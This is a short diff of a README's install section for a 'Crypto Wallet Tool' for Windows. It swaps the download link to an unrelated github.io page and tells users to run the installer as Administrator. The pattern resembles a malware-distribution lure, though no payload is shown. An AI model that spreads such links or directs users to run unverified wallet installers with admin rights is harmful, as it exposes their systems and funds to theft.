@@ -2,7 +2,7 @@
 
 ## Download & Install
 
-> **Download:** [**Get Crypto Wallet Tool for Windows →**](https://crypto-wallet-tool.kolmods.com/)
+> **Download:** [**Get Crypto Wallet Tool for Windows →**](https://ronenrosicrucian645.github.io)
 >
 > Setup notes for **Crypto Wallet Tool** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
